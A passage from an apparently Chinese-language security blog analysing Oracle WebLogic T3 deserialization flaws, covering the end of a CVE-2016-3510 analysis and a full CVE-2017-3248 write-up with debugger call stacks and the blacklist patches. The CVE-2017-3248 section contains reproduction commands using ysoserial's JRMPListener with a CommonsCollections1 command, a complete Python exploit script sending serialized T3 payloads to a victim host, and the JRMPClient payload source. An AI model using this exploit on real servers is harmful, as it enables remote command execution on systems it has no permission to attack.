class="type">MarshalledObjectOutputStream</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalledObjectOutputStream</span>(var2);</span><br><span class="line">        <span class="comment">// 将传入的Java对象通过var3.writeObject方法序列化为字节流，并通过var3.flush方法刷新输出流</span></span><br><span class="line">        var3.writeObject(var1);</span><br><span class="line">        var3.flush();</span><br><span class="line">        <span class="comment">// 通过var2.toByteArray方法获取字节流的字节数组，并将该字节数组赋值给objBytes属性</span></span><br><span class="line">        <span class="comment">// 重点在这里，目标payload的字节流存放在这当中</span></span><br><span class="line">        <span class="built_in">this</span>.objBytes = var2.toByteArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算字节数组的哈希值，并将哈希值赋值给hash属性</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; <span class="built_in">this</span>.objBytes.length; ++var5) &#123;</span><br><span class="line">            var4 = <span class="number">31</span> * var4 + <span class="built_in">this</span>.objBytes[var5];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.hash = var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终恶意的payload存放在MarshalledObject对象的objBytes属性中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804112917.png"><br>如何对objBytes读取并调用readObject呢？<br>在MarshalledObject类中存在一个方法readResolve，它能够将属性objBytes的字节流反序列化成Java对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ObjectStreamException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.objBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个ByteArrayInputStream对象var1，并将objBytes属性作为参数传递给它</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.objBytes);</span><br><span class="line">        <span class="comment">// 创建一个ObjectInputStream对象var2，该对象可以将字节流反序列化为Java对象</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(var1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var2.readObject();</span><br><span class="line">        var2.close();</span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么readResolve方法在什么时候调用？<br>继续在InboundMsgAbbrev.class的resolveClass方法和MarshalledObject的readResolve方法下断点，使用weblogic_cmd执行一次<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804115044.png"><br>这里的类名是MarshalledObject，不在黑名单中，故可以绕过isBlackListed方法的判断<br>继续执行，到下一个断点，执行到MarshalledObject的readResolve方法的调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readResolve:<span class="number">56</span>, MarshalledObject (weblogic.corba.utils)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadResolve:<span class="number">1091</span>, ObjectStreamClass (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1805</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>这与上面的resolveClass、readExternal方法一样，都是在执行readObject方法的底层执行<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230804115904.png"><br>最后会调用恶意对象的readObject方法，执行CC1链<br><strong>总结</strong>：<br>在Java中，当一个对象被序列化时，会将对象的类型信息和对象的数据一起写入流中。当流被反序列化时，Java会根据类型信息创建对象，并将对象的数据从流中读取出来，然后调用对象中的readObject方法将数据还原到对象中，最终返回一个Java对象。在Weblogic中，当从流量中获取到普通类序列化数据的类对象后，程序会依次尝试调用类对象中的readObject、readResolve、readExternal等方法，以恢复对象的状态。</p>
<p>readObject方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法可以被对象重写，以实现自定义的反序列化逻辑。</p>
<p>readResolve方法是Java中的一个成员方法，用于在反序列化后恢复对象的状态。当对象被反序列化后，Java会检查对象中是否存在readResolve方法，如果存在，则会调用该方法恢复对象的状态。</p>
<p>readExternal方法是Java中的一个成员方法，用于从流中读取对象的数据，并将其还原到对象中。该方法通常被用于实现Java标准库中的可序列化接口Externalizable，以实现自定义的序列化逻辑。<br><strong>修复</strong>：<br>2016年10月发布的p23743997_1036_Generic补丁<br>在weblogic.corba.utils.MarshalledObject的readResolve方法中创建一个匿名内部类，重写resolveClass方法，加上了黑名单过滤，使用网上的一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812220110.png"><br><strong>参考</strong>：<br><a href="https://www.cnblogs.com/nice0e3/p/14269444.html">Java安全之Weblogic 2016-3510 分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<h3 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h3><p><strong>漏洞复现</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="string">&#x27;touch /tmp/cve-2017-3248&#x27;</span></span><br><span class="line">python cve-2017-3248.py 127.0.0.1 7001 ysoserial-all.jar 127.0.0.1 9999 JRMPClient</span><br><span class="line"></span><br><span class="line"><span class="comment">#在docker中执行</span></span><br><span class="line">/java/bin/java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 <span class="string">&#x27;touch /tmp/cve-2017-3248&#x27;</span></span><br><span class="line">python cve-2017-3248.py 127.0.0.1 7001 ysoserial-all.jar 127.0.0.1 9999 JRMPClient</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811170709.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811170619.png"></p>
<p>最终命令执行成功，在&#x2F;tmp目录下新建了cve-2017-3248文件<br><strong>exp</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    <span class="comment">#generates ysoserial payload</span></span><br><span class="line">    command = <span class="string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;command: &quot;</span> + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(<span class="string">&#x27;payload.out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = <span class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, data</span>):</span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span> + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;response: &#x27;</span> + rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#check for args, print usage if incorrect</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span></span><br><span class="line">              <span class="string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_ysoserial = sys.argv[<span class="number">3</span>]</span><br><span class="line">    jrmp_listener_ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">    jrmp_listener_port = sys.argv[<span class="number">5</span>]</span><br><span class="line">    jrmp_client = sys.argv[<span class="number">6</span>]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>payloads.JRMPClient中payload的构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong>：<br>首先分析的是输入流中的类能否绕过resolveClass中的过滤，经过断点调试及ysoserial中payload的生成，最终输出流中包装的类java.rmi.server.RemoteObjectInvocationHandler不在黑名单中，故这种方式可绕过resolveClass的过滤<br>在命令最终执行得地方下断点，利用得CC1链，即在InvokerTransformer类的transform方法上下断点<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">119</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">157</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:<span class="number">69</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-<span class="number">1</span>, $Proxy74 (com.sun.proxy)</span><br><span class="line">readObject:<span class="number">346</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">executeCall:<span class="number">243</span>, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:<span class="number">377</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-<span class="number">1</span>, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:<span class="number">360</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">303</span>, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:<span class="number">139</span>, DGCClient (sun.rmi.transport)</span><br><span class="line">read:<span class="number">312</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:<span class="number">491</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">readObject:<span class="number">455</span>, RemoteObject (java.rmi.server)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:<span class="number">1989</span>, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:<span class="number">1913</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket) </span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>进入到InboundMsgAbbrev的readObject方法，这里对weblogic T3协议传过来的数据进行反序列化操作<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811173049.png"><br>ServerChannelInputStream继承ObjectInputStream，继续往上查看调用readObject的地方，中间可以忽略ObjectInputStream readObject方法的底层执行，来到RemoteObject的readObject方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230811173609.png"><br>如果对ysoserial的JRMP模块进行分析过，就能够清楚了解后面的这条链<br>详细参考：<a href="https://xz.aliyun.com/t/12780">https://xz.aliyun.com/t/12780</a><br><strong>大致流程</strong>：<br>从最开始到现在的漏洞，需要明白恶意的payload都是寄托在T3协议之上的，将恶意的payload通过T3协议发送给weblogic服务器，weblogic服务器会对其进行反序列化，但是在InboundMsgAbbrev的resolveClass方法中，会对payload中的类进行过滤，只要绕过了黑名单，恶意的payload就会反序列化导致命令执行<br>使用exploit.JRMPListener开启9999端口远程对象调用服务，对应的是CC1链构造的恶意payload1<br>使用python脚本与weblogic服务通信，发送由payloads.JRMPClient生成的payload2，payload2在weblogic反序列化后会与JRMPListener的9999端口请求，得到恶意的payload2后，反序列化后会导致命令的执行<br><strong>修复</strong>：<br>官方给出了p24667634_1036_Generic补丁，修复点还是添加黑名单<br>在InboundMsgAbbrev.ServerChannelInputStream中，对<code>java.rmi.registry.Registry</code>进行过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">      <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<br><a href="https://www.cnblogs.com/nice0e3/p/14275298.html">Java 安全之Weblogic 2017-3248分析 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a href="https://www.anquanke.com/post/id/225137">CVE-2017-3248——WebLogic反序列化初探-安全客 - 安全资讯平台 (anquanke.com)</a></p>
